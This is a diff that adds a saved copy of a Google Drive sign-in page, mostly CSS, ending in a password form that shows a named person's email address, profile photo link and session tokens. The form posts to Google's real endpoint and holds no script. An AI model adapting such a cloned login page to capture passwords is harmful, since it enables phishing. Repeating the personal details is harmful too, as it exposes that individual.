@@ -1,0 +1,1457 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8">
+  <meta content="width=300, initial-scale=1" name="viewport">
+  <meta name="google" value="notranslate">
+  <meta name="robots" content="noindex">
+  <meta name="description" content="Create and share your work online and access your documents from anywhere. Manage documents, spreadsheets, presentations, surveys, and more all in one easy to use productivity suite. It&#39;s easy to get started - just upload a file from your desktop.">
+  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
+  <title>Google Drive</title>
+  <style>
+  /* cyrillic-ext */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 300;
+  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTa-j2U0lmluP9RWlSytm3ho.woff2) format('woff2');
+  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 300;
+  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTZX5f-9o1vgP2EXwfjgl7AY.woff2) format('woff2');
+  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* greek-ext */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 300;
+  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTRWV49_lSm1NYrwo-zkhivY.woff2) format('woff2');
+  unicode-range: U+1F00-1FFF;
+}
+/* greek */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 300;
+  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTaaRobkAwv3vxw3jMhVENGA.woff2) format('woff2');
+  unicode-range: U+0370-03FF;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 300;
+  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTf8zf_FOSsgRmwsS7Aa9k2w.woff2) format('woff2');
+  unicode-range: U+0102-0103, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 300;
+  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTT0LW-43aMEzIO6XUTLjad8.woff2) format('woff2');
+  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 300;
+  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTegdm0LZdjqr5-oayXSOefg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+}
+/* cyrillic-ext */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 400;
+  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/K88pR3goAWT7BTt32Z01mxJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
+  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 400;
+  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/RjgO7rYTmqiVp7vzi-Q5URJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
+  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* greek-ext */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 400;
+  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/LWCjsQkB6EMdfHrEVqA1KRJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
+  unicode-range: U+1F00-1FFF;
+}
+/* greek */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 400;
+  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/xozscpT2726on7jbcb_pAhJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
+  unicode-range: U+0370-03FF;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 400;
+  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/59ZRklaO5bWGqF5A9baEERJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
+  unicode-range: U+0102-0103, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 400;
+  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/u-WUoqrET9fUeobQW7jkRRJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
+  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 400;
+  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/cJZKeOuBrn4kERxqtaUH3VtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+}
+  </style>
+  <style>
+  h1, h2 {
+  -webkit-animation-duration: 0.1s;
+  -webkit-animation-name: fontfix;
+  -webkit-animation-iteration-count: 1;
+  -webkit-animation-timing-function: linear;
+  -webkit-animation-delay: 0;
+  }
+  @-webkit-keyframes fontfix {
+  from {
+  opacity: 1;
+  }
+  to {
+  opacity: 1;
+  }
+  }
+  </style>
+<style>
+  html, body {
+  font-family: Arial, sans-serif;
+  background: #fff;
+  margin: 0;
+  padding: 0;
+  border: 0;
+  position: absolute;
+  height: 100%;
+  min-width: 100%;
+  font-size: 13px;
+  color: #404040;
+  direction: ltr;
+  -webkit-text-size-adjust: none;
+  }
+  button,
+  input[type=button],
+  input[type=submit] {
+  font-family: Arial, sans-serif;
+  font-size: 13px;
+  }
+  a,
+  a:hover,
+  a:visited {
+  color: #427fed;
+  cursor: pointer;
+  text-decoration: none;
+  }
+  a:hover {
+  text-decoration: underline;
+  }
+  h1 {
+  font-size: 20px;
+  color: #262626;
+  margin: 0 0 15px;
+  font-weight: normal;
+  }
+  h2 {
+  font-size: 14px;
+  color: #262626;
+  margin: 0 0 15px;
+  font-weight: bold;
+  }
+  input[type=email],
+  input[type=number],
+  input[type=password],
+  input[type=tel],
+  input[type=text],
+  input[type=url] {
+  -moz-appearance: none;
+  -webkit-appearance: none;
+  appearance: none;
+  display: inline-block;
+  height: 36px;
+  padding: 0 8px;
+  margin: 0;
+  background: #fff;
+  border: 1px solid #d9d9d9;
+  border-top: 1px solid #c0c0c0;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  -moz-border-radius: 1px;
+  -webkit-border-radius: 1px;
+  border-radius: 1px;
+  font-size: 15px;
+  color: #404040;
+  }
+  input[type=email]:hover,
+  input[type=number]:hover,
+  input[type=password]:hover,
+  input[type=tel]:hover,
+  input[type=text]:hover,
+  input[type=url]:hover {
+  border: 1px solid #b9b9b9;
+  border-top: 1px solid #a0a0a0;
+  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+  }
+  input[type=email]:focus,
+  input[type=number]:focus,
+  input[type=password]:focus,
+  input[type=tel]:focus,
+  input[type=text]:focus,
+  input[type=url]:focus {
+  outline: none;
+  border: 1px solid #4d90fe;
+  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+  }
+  input[type=checkbox],
+  input[type=radio] {
+  -webkit-appearance: none;
+  display: inline-block;
+  width: 13px;
+  height: 13px;
+  margin: 0;
+  cursor: pointer;
+  vertical-align: bottom;
+  background: #fff;
+  border: 1px solid #c6c6c6;
+  -moz-border-radius: 1px;
+  -webkit-border-radius: 1px;
+  border-radius: 1px;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  position: relative;
+  }
+  input[type=checkbox]:active,
+  input[type=radio]:active {
+  background: #ebebeb;
+  }
+  input[type=checkbox]:hover {
+  border-color: #c6c6c6;
+  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+  }
+  input[type=radio] {
+  -moz-border-radius: 1em;
+  -webkit-border-radius: 1em;
+  border-radius: 1em;
+  width: 15px;
+  height: 15px;
+  }
+  input[type=checkbox]:checked,
+  input[type=radio]:checked {
+  background: #fff;
+  }
+  input[type=radio]:checked::after {
+  content: '';
+  display: block;
+  position: relative;
+  top: 3px;
+  left: 3px;
+  width: 7px;
+  height: 7px;
+  background: #666;
+  -moz-border-radius: 1em;
+  -webkit-border-radius: 1em;
+  border-radius: 1em;
+  }
+  input[type=checkbox]:checked::after {
+  content: url(https://ssl.gstatic.com/ui/v1/menu/checkmark.png);
+  display: block;
+  position: absolute;
+  top: -6px;
+  left: -5px;
+  }
+  input[type=checkbox]:focus {
+  outline: none;
+  border-color: #4d90fe;
+  }
+  .stacked-label {
+  display: block;
+  font-weight: bold;
+  margin: .5em 0;
+  }
+  .hidden-label {
+  position: absolute !important;
+  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
+  clip: rect(1px, 1px, 1px, 1px);
+  height: 0px;
+  width: 0px;
+  overflow: hidden;
+  visibility: hidden;
+  }
+  input[type=checkbox].form-error,
+  input[type=email].form-error,
+  input[type=number].form-error,
+  input[type=password].form-error,
+  input[type=text].form-error,
+  input[type=tel].form-error,
+  input[type=url].form-error {
+  border: 1px solid #dd4b39;
+  }
+  .error-msg {
+  margin: .5em 0;
+  display: block;
+  color: #dd4b39;
+  line-height: 17px;
+  }
+  .help-link {
+  background: #dd4b39;
+  padding: 0 5px;
+  color: #fff;
+  font-weight: bold;
+  display: inline-block;
+  -moz-border-radius: 1em;
+  -webkit-border-radius: 1em;
+  border-radius: 1em;
+  text-decoration: none;
+  position: relative;
+  top: 0px;
+  }
+  .help-link:visited {
+  color: #fff;
+  }
+  .help-link:hover {
+  color: #fff;
+  background: #c03523;
+  text-decoration: none;
+  }
+  .help-link:active {
+  opacity: 1;
+  background: #ae2817;
+  }
+  .wrapper {
+  position: relative;
+  min-height: 100%;
+  }
+  .content {
+  padding: 0 44px;
+  }
+  .main {
+  padding-bottom: 100px;
+  }
+  /* For modern browsers */
+  .clearfix:before,
+  .clearfix:after {
+  content: "";
+  display: table;
+  }
+  .clearfix:after {
+  clear: both;
+  }
+  /* For IE 6/7 (trigger hasLayout) */
+  .clearfix {
+  zoom:1;
+  }
+  .google-header-bar {
+  height: 71px;
+  border-bottom: 1px solid #e5e5e5;
+  overflow: hidden;
+  }
+  .header .logo {
+  background-image: url(https://ssl.gstatic.com/accounts/ui/logo_1x.png);
+  background-size: 116px 38px;
+  background-repeat: no-repeat;
+  margin: 17px 0 0;
+  float: left;
+  height: 38px;
+  width: 116px;
+  }
+  .header .logo-w {
+  background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png);
+  background-size: 112px 36px;
+  margin: 21px 0 0;
+  }
+  .header .secondary-link {
+  margin: 28px 0 0;
+  float: right;
+  }
+  .header .secondary-link a {
+  font-weight: normal;
+  }
+  .google-header-bar.centered {
+  border: 0;
+  height: 108px;
+  }
+  .google-header-bar.centered .header .logo {
+  float: none;
+  margin: 40px auto 30px;
+  display: block;
+  }
+  .google-header-bar.centered .header .secondary-link {
+  display: none
+  }
+  .google-footer-bar {
+  position: absolute;
+  bottom: 0;
+  height: 35px;
+  width: 100%;
+  border-top: 1px solid #e5e5e5;
+  overflow: hidden;
+  }
+  .footer {
+  padding-top: 7px;
+  font-size: .85em;
+  white-space: nowrap;
+  line-height: 0;
+  }
+  .footer ul {
+  float: left;
+  max-width: 80%;
+  min-height: 16px;
+  padding: 0;
+  }
+  .footer ul li {
+  color: #737373;
+  display: inline;
+  padding: 0;
+  padding-right: 1.5em;
+  }
+  .footer a {
+  color: #737373;
+  }
+  .lang-chooser-wrap {
+  float: right;
+  display: inline;
+  }
+  .lang-chooser-wrap img {
+  vertical-align: top;
+  }
+  .lang-chooser {
+  font-size: 13px;
+  height: 24px;
+  line-height: 24px;
+  }
+  .lang-chooser option {
+  font-size: 13px;
+  line-height: 24px;
+  }
+  .hidden {
+  height: 0px;
+  width: 0px;
+  overflow: hidden;
+  visibility: hidden;
+  display: none !important;
+  }
+  .banner {
+  text-align: center;
+  }
+  .card {
+  background-color: #f7f7f7;
+  padding: 20px 25px 30px;
+  margin: 0 auto 25px;
+  width: 304px;
+  -moz-border-radius: 2px;
+  -webkit-border-radius: 2px;
+  border-radius: 2px;
+  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+  }
+  .card > *:first-child {
+  margin-top: 0;
+  }
+  .rc-button,
+  .rc-button:visited {
+  display: inline-block;
+  min-width: 46px;
+  text-align: center;
+  color: #444;
+  font-size: 14px;
+  font-weight: 700;
+  height: 36px;
+  padding: 0 8px;
+  line-height: 36px;
+  -moz-border-radius: 3px;
+  -webkit-border-radius: 3px;
+  border-radius: 3px;
+  -o-transition: all 0.218s;
+  -moz-transition: all 0.218s;
+  -webkit-transition: all 0.218s;
+  transition: all 0.218s;
+  border: 1px solid #dcdcdc;
+  background-color: #f5f5f5;
+  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
+  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
+  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
+  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
+  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
+  -o-transition: none;
+  -moz-user-select: none;
+  -webkit-user-select: none;
+  user-select: none;
+  cursor: default;
+  }
+  .card .rc-button {
+  width: 100%;
+  padding: 0;
+  }
+  .rc-button.disabled,
+  .rc-button[disabled] {
+  opacity: .5;
+  filter: alpha(opacity=50);
+  cursor: default;
+  pointer-events: none;
+  }
+  .rc-button:hover {
+  border: 1px solid #c6c6c6;
+  color: #333;
+  text-decoration: none;
+  -o-transition: all 0.0s;
+  -moz-transition: all 0.0s;
+  -webkit-transition: all 0.0s;
+  transition: all 0.0s;
+  background-color: #f8f8f8;
+  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
+  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
+  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
+  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
+  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
+  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
+  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
+  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
+  }
+  .rc-button:active {
+  background-color: #f6f6f6;
+  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
+  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
+  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
+  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
+  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
+  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+  }
+  .rc-button-submit,
+  .rc-button-submit:visited {
+  border: 1px solid #3079ed;
+  color: #fff;
+  text-shadow: 0 1px rgba(0,0,0,0.1);
+  background-color: #4d90fe;
+  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
+  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
+  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
+  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
+  background-image: linear-gradient(top,#4d90fe,#4787ed);
+  }
+  .rc-button-submit:hover {
+  border: 1px solid #2f5bb7;
+  color: #fff;
+  text-shadow: 0 1px rgba(0,0,0,0.3);
+  background-color: #357ae8;
+  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
+  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
+  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
+  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
+  background-image: linear-gradient(top,#4d90fe,#357ae8);
+  }
+  .rc-button-submit:active {
+  background-color: #357ae8;
+  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
+  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
+  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
+  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
+  background-image: linear-gradient(top,#4d90fe,#357ae8);
+  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+  }
+  .rc-button-red,
+  .rc-button-red:visited {
+  border: 1px solid transparent;
+  color: #fff;
+  text-shadow: 0 1px rgba(0,0,0,0.1);
+  background-color: #d14836;
+  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
+  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
+  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
+  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
+  background-image: linear-gradient(top,#dd4b39,#d14836);
+  }
+  .rc-button-red:hover {
+  border: 1px solid #b0281a;
+  color: #fff;
+  text-shadow: 0 1px rgba(0,0,0,0.3);
+  background-color: #c53727;
+  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
+  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
+  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
+  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
+  background-image: linear-gradient(top,#dd4b39,#c53727);
+  }
+  .rc-button-red:active {
+  border: 1px solid #992a1b;
+  background-color: #b0281a;
+  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
+  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
+  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
+  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
+  background-image: linear-gradient(top,#dd4b39,#b0281a);
+  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+  }
+  .secondary-actions {
+  text-align: center;
+  }
+</style>
+<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
+  .google-header-bar.centered {
+  height: 83px;
+  }
+  .google-header-bar.centered .header .logo {
+  margin: 25px auto 20px;
+  }
+  .card {
+  margin-bottom: 20px;
+  }
+</style>
+<style media="screen and (max-width: 580px)">
+  html, body {
+  font-size: 14px;
+  }
+  .google-header-bar.centered {
+  height: 73px;
+  }
+  .google-header-bar.centered .header .logo {
+  margin: 20px auto 15px;
+  }
+  .content {
+  padding-left: 10px;
+  padding-right: 10px;
+  }
+  .hidden-small {
+  display: none;
+  }
+  .card {
+  padding: 20px 15px 30px;
+  width: 270px;
+  }
+  .footer ul li {
+  padding-right: 1em;
+  }
+  .lang-chooser-wrap {
+  display: none;
+  }
+</style>
+<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
+  .header .logo {
+  background-image: url(https://ssl.gstatic.com/accounts/ui/logo_2x.png);
+  }
+  .header .logo-w {
+  background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_112x36dp.png);
+  }
+</style>
+<style>
+  pre.debug {
+  font-family: monospace;
+  position: absolute;
+  left: 0;
+  margin: 0;
+  padding: 1.5em;
+  font-size: 13px;
+  background: #f1f1f1;
+  border-top: 1px solid #e5e5e5;
+  direction: ltr;
+  white-space: pre-wrap;
+  width: 90%;
+  overflow: hidden;
+  }
+</style>
+<style>
+  .banner h1 {
+  font-family: 'Open Sans', arial;
+  -webkit-font-smoothing: antialiased;
+  color: #555;
+  font-size: 42px;
+  font-weight: 300;
+  margin-top: 0;
+  margin-bottom: 20px;
+  }
+  .banner h2 {
+  font-family: 'Open Sans', arial;
+  -webkit-font-smoothing: antialiased;
+  color: #555;
+  font-size: 18px;
+  font-weight: 400;
+  margin-bottom: 20px;
+  }
+  .signin-card {
+  width: 274px;
+  padding: 40px 40px;
+  }
+  .signin-card .profile-img {
+  width: 96px;
+  height: 96px;
+  margin: 0 auto 10px;
+  display: block;
+  -moz-border-radius: 50%;
+  -webkit-border-radius: 50%;
+  border-radius: 50%;
+  }
+  .signin-card .profile-name {
+  font-size: 16px;
+  font-weight: bold;
+  text-align: center;
+  margin: 10px 0 0;
+  min-height: 1em;
+  }
+  .signin-card .profile-email {
+  font-size: 16px;
+  text-align: center;
+  margin: 10px 0 20px 0;
+  min-height: 1em;
+  }
+  .signin-card input[type=email],
+  .signin-card input[type=password],
+  .signin-card input[type=text],
+  .signin-card input[type=submit] {
+  width: 100%;
+  display: block;
+  margin-bottom: 10px;
+  z-index: 1;
+  position: relative;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  }
+  .signin-card #Email,
+  .signin-card #Passwd,
+  .signin-card .captcha {
+  direction: ltr;
+  height: 44px;
+  font-size: 16px;
+  }
+  .signin-card #Email + .stacked-label {
+  margin-top: 15px;
+  }
+  .signin-card #reauthEmail {
+  display: block;
+  margin-bottom: 10px;
+  line-height: 36px;
+  padding: 0 8px;
+  font-size: 15px;
+  color: #404040;
+  line-height: 2;
+  margin-bottom: 10px;
+  font-size: 14px;
+  text-align: center;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  }
+  .one-google p {
+  margin: 0 0 10px;
+  color: #555;
+  font-size: 14px;
+  text-align: center;
+  }
+  .one-google p.create-account,
+  .one-google p.switch-account {
+  margin-bottom: 60px;
+  }
+  .one-google .logo-strip {
+  background-repeat: no-repeat;
+  display: block;
+  margin: 10px auto;
+  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png);
+  background-size: 230px 17px;
+  width: 230px;
+  height: 17px;
+  }
+</style>
+<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
+  .banner h1 {
+  font-size: 38px;
+  margin-bottom: 15px;
+  }
+  .banner h2 {
+  margin-bottom: 15px;
+  }
+  .one-google p.create-account,
+  .one-google p.switch-account {
+  margin-bottom: 30px;
+  }
+  .signin-card #Email {
+  margin-bottom: 0;
+  }
+  .signin-card #Passwd {
+  margin-top: -1px;
+  }
+  .signin-card #Email.form-error,
+  .signin-card #Passwd.form-error {
+  z-index: 2;
+  }
+  .signin-card #Email:hover,
+  .signin-card #Email:focus,
+  .signin-card #Passwd:hover,
+  .signin-card #Passwd:focus {
+  z-index: 3;
+  }
+</style>
+<style media="screen and (max-width: 580px)">
+  .banner h1 {
+  font-size: 22px;
+  margin-bottom: 15px;
+  }
+  .signin-card {
+  width: 260px;
+  padding: 20px 20px;
+  margin: 0 auto 20px;
+  }
+  .signin-card .profile-img {
+  width: 72px;
+  height: 72px;
+  -moz-border-radius: 72px;
+  -webkit-border-radius: 72px;
+  border-radius: 72px;
+  }
+</style>
+<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
+  .one-google .logo-strip {
+  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_2x.png);
+  }
+</style>
+  </head>
+  <body>
+  <div class="wrapper">
+  <div class="google-header-bar  centered">
+  <div class="header content clearfix">
+  <div class="logo logo-w" aria-label="Google"></div>
+  </div>
+  </div>
+  <div class="main content clearfix">
+<div class="banner">
+<h1>
+  One account. All of Google.
+</h1>
+  <h2 class="hidden-small">
+  Sign in to continue to Google Drive
+  </h2>
+</div>
+<div id="rsi-card" class="card signin-card">
+  <div id="cc_iframe_parent"></div>
+<img id="profile-img" class="profile-img" src="//lh3.googleusercontent.com/-h3JRT10hBY8/AAAAAAAAAAI/AAAAAAAAAAA/ADhl2ypdcfP8NTar8gfAo4CjtgW_Dl3I9g/mo/photo.jpg?sz=120" alt="">
+<p class="profile-name">Jilani Khandaker</p>
+  <form novalidate method="post" action="https://accounts.google.com/ServiceLoginAuth" id="gaia_loginform">
+  <input name="Page" type="hidden" value="RememberedSignIn">
+  <input type="hidden" name="GALX" value="1m2YFiC0_rw">
+  <input type="hidden" name="gxf" value="AFoagUXMUJxpmDDPb1HXTv_riKIV0Rvg7A:1462464914954">
+  <input type="hidden" name="continue" value="https://docs.google.com/nonceSigner?nonce=fn057heo1kvvs&amp;continue=https://doc-08-ak-docs.googleusercontent.com/docs/securesc/t8jfo3ir8mgbi1cdcngida0ptli8vf4a/f0ph1hisclr4hfan8tt35a1jml572bee/1462464000000/11436351527929101308/11436351527929101308/0B28o-MfxY-x4Vm5xanIxd2dsRkk?e%3Ddownload&amp;hash=gsmluj5goane5jaull3mvs1gvdk2ba32">
+  <input type="hidden" name="followup" value="https://docs.google.com/nonceSigner?nonce=fn057heo1kvvs&amp;continue=https://doc-08-ak-docs.googleusercontent.com/docs/securesc/t8jfo3ir8mgbi1cdcngida0ptli8vf4a/f0ph1hisclr4hfan8tt35a1jml572bee/1462464000000/11436351527929101308/11436351527929101308/0B28o-MfxY-x4Vm5xanIxd2dsRkk?e%3Ddownload&amp;hash=gsmluj5goane5jaull3mvs1gvdk2ba32">
+  <input type="hidden" name="service" value="writely">
+  <input type="hidden" name="ltmpl" value="homepage">
+  <input type="hidden" id="_utf8" name="_utf8" value="&#9731;"/>
+  <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
+  <input type="hidden" id="pstMsg" name="pstMsg" value="0">
+  <input type="hidden" id="dnConn" name="dnConn" value="">
+  <input type="hidden" id="checkConnection" name="checkConnection" value="">
+  <input type="hidden" id="checkedDomains" name="checkedDomains"
+         value="youtube">
+<span id="reauthEmail" class="reauth-email">jilanicsejnu@gmail.com</span>
+<input id="Email" name="Email" type="email" class="email-input hidden"
+     placeholder="Email"
+     value="jilanicsejnu@gmail.com"
+     spellcheck="false" readonly>
+<label class="hidden-label" for="Passwd">Password</label>
+<input id="Passwd" name="Passwd" type="password"
+       placeholder="Password"
+       class="">
+  <input type="hidden" name="PersistentCookie" value="yes">
+<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
+  </form>
+  <a id="link-forgot-passwd" href="https://accounts.google.com/signin/recovery?service=writely&amp;continue=https%3A%2F%2Fdocs.google.com%2FnonceSigner%3Fnonce%3Dfn057heo1kvvs%26continue%3Dhttps%3A%2F%2Fdoc-08-ak-docs.googleusercontent.com%2Fdocs%2Fsecuresc%2Ft8jfo3ir8mgbi1cdcngida0ptli8vf4a%2Ff0ph1hisclr4hfan8tt35a1jml572bee%2F1462464000000%2F11436351527929101308%2F11436351527929101308%2F0B28o-MfxY-x4Vm5xanIxd2dsRkk%3Fe%253Ddownload%26hash%3Dgsmluj5goane5jaull3mvs1gvdk2ba32&amp;Email=jilanicsejnu%40gmail.com&amp;ignoreShadow=0&amp;hl=en" class="need-help">
+  Need help?
+  </a>
+</div>
+<div class="one-google">
+  <p class="switch-account">
